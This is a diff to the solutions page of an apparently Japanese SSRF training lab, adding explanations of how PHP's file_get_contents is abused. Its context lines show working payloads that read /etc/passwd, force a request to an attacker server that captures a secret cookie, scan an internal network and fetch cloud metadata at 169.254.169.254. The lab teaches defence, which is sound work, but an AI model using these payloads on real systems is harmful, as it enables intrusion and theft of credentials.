@@ -48,6 +48,9 @@ Accept-Language: ja,en-US;q=0.9,en;q=0.8
 pid=1&tmp_file_path=%2Fetc%2Fpasswd</pre>
             <p>エクスポートでユーザリストをダウンロードしてください。<code>/etc/passwd</code>の内容が取得できていることが確認できます。</p>
             <code>FLAG_A7D3C0BA0F:x:1000:1000::/home/FLAG_A7D3C0BA0F:/sbin/nologin</code>
+            <hr>
+            <h2>解説</h2>
+            <p><code>tmp_file_path</code>の値は、PHPの<a href="https://www.php.net/manual/ja/function.file-get-contents.php"><code>file_get_contents</code></a>関数に渡されています。<code>file_get_contents</code>関数にローカルのファイルパスを指定することで、そのファイルを取得して内容を返します。</p>
         <?php elseif($_POST['solution'] === "2"): ?>
             <p>攻撃者サーバにリクエストさせ、そのリクエストの中身を見てみましょう<br />
             docker内部から攻撃者サーバにリクエストさせる場合は<code>http://attacker_server:8888</code>を指定する必要があります。
@@ -73,7 +76,10 @@ Headers:
 Host: attacker_server:8888
 Connection: close
 Cookie: secret=FLAG_9E96EBD40C</pre>
-            
+            <hr>
+            <h2>解説</h2>
+            <p><a href="https://www.php.net/manual/ja/function.file-get-contents.php"><code>file_get_contents</code></a>関数は、ファイルパスだけでなくURLも引数として受け取ります。外部URLを渡すことで、URL先にアクセスして内容を返します。今回の脆弱性のように攻撃者が用意したサーバ宛てにリクエストを強制させることをSSRFと呼びます。</p>
+
         <?php elseif($_POST['solution'] === "3"): ?>
             <p>管理者ページ(<code>https://<?= $_SERVER['SERVER_ADDR'] ?>:1443/admin.php</code>)は、docker内部ネットワーク(<code>1.1.1.0/29</code>)からのアクセスのみ許可されています。<br />ブラウザからはアクセスできないため、SSRFを悪用して、内部ネットワーク経由でアクセスした情報を盗み見ることが可能です。</p>
             <p>内部ネットワーク側で振られているサーバのIPアドレスが分からない場合は、<code>1.1.1.0/29</code>で利用可能なホストアドレスを総当たりし、レスポンスが取得できるIPアドレスを探しましょう。</p>
@@ -96,7 +102,10 @@ pid=1&tmp_file_path=https://<?= $_SERVER['SERVER_ADDR'] ?>:1443/admin.php</pre>
             <pre class="codepre">
 10,&lt;p&gt;Congratilation!&lt;/p&gt;,
 11,"&lt;p&gt;FLAG is FLAG_3488619AE9&lt;/p&gt;",</pre>
-            </div>
+
+            <hr>
+            <h2>解説</h2>
+            <p>FLAG2では、外部URLを渡していましたがWebサーバから到達できる範囲であれば隣接するネットワークやWebサーバ自身に対してアクセスすることも可能です。今回の<code>/admin.php</code>は外部からのアクセスを拒否しており、内部NW(<code>1.1.1.0/24</code>)からのみアクセス許可をしています。Webサーバ自身は<code>1.1.1.4</code>のため、<code>https://1.1.1.4:1443/admin.php</code>を指定することでアクセスすることができます。</p>
         <?php elseif($_POST['solution'] === "4"): ?>
             <p>内部ネットワーク内に存在するホストを探し出します。<br />
             総当たりを行う場合、BurpであればIntruderを使うのが簡単です。<br />
@@ -177,6 +186,11 @@ for port in range(80,99):
             <pre class="codepre">
 703,"&lt;p&gt;Welcome to Internal Web Server!&lt;/p&gt;",
 704,"&lt;p&gt; FLAG is FLAG_726C6BEDAE&lt;/p&gt;",</pre>
+            
+            <hr>
+            <h2>解説</h2>
+            <p>FLAG2では、外部URLを渡していましたがWebサーバから到達できる範囲であれば隣接するネットワークやWebサーバ自身に対してアクセスすることも可能です。FLAG3と異なっている点として、Secret Web serverのIPアドレスが分かりません。そのため内部ネットワークを探索して存在するホストを見つけ出す必要があります。上記のPythonコードは、<code>tmp_file_path</code>パラメータの値に、<code>https://1.1.1.1</code>から<code>https://1.1.1.7</code>までの値を順番に渡してリクエストしています。このリクエストによって内部では<code>file_get_contents</code>関数が指定されたURLにアクセスし、内容が取得できれば正常処理(つまりここではユーザ登録の成功を意味します)、取得できなければエラーを返します。</p>
+            <p>この演習では、隣接するネットワークへのアクセスだけでなく、httpとhttpsによるプロトコルの切り替え、ポート番号の総当たりなども可能であることを示しています。</p>
 
         <?php elseif($_POST['solution'] === "5"): ?>
             <p>クラウドのメタデータを探します。<br />
@@ -202,7 +216,6 @@ pid=1&tmp_file_path=http%3a//169.254.169.254/latest/meta-data/user-data</pre>
 53,FLAG_0F363AF467,</pre>
             <div class="bd-callout bd-callout-info">
                 <p class="mb-0">メタデータの取得確認までを目的としているため、user-data以外のファイルの中身も全て同一のFLAGにしています。</p>
-            </div>
             </div>
         <?php endif ?>
     <?php endif ?>
